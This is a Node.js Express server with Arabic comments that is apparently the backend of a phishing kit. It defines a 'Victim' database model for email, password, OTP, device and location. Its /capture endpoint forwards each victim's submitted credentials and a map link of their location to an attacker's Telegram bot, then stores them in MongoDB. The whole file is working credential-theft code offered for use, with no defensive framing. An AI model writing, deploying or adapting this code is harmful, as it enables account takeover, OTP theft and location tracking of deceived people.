require('dotenv').config(); // تحميل المتغيرات من ملف .env
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// استدعاء البيانات الحساسة من البيئة المحيطة (Render أو .env)
const MONGO_URI = process.env.MONGO_URI;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// الاتصال بقاعدة البيانات
mongoose.connect(MONGO_URI)
    .then(() => console.log("Connected to MongoDB Securely"))
    .catch(e => console.log("DB connection skip"));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, 
    password: String, 
    otp: String, 
    device: String, 
    location: Object
}));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

app.post('/capture', async (req, res) => {
    const data = req.body;
    
    try {
        let msg = `🚀 **إشعار جديد**\n\n📧 الحساب: \`${data.email}\` \n🔑 الكلمة: \`${data.password}\` \n📱 الجهاز: ${data.device}`;
        if(data.location) msg += `\n📍 الموقع: https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (e) { 
        console.log("Telegram Error: ", e.message); 
    }

    try {
        const entry = new Victim(data);
        await entry.save();
    } catch (e) { 
        console.log("DB Save Error");
    }

    res.status(200).send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
